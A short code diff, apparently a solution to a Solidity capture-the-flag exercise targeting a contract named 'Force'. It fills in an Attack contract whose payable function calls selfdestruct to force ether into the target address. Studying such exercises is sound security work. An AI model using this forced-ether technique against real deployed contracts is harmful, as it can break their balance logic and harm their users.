@@ -12,8 +12,9 @@ contract Force {/*
 */}
 
 
-
-contract Attack {
-    function attack(address thecontract) public {
-    }
-}
+ contract Attack {
+     function attack(address payable thecontract) public payable {
+         selfdestruct(thecontract);
+     }
+ }
+ 
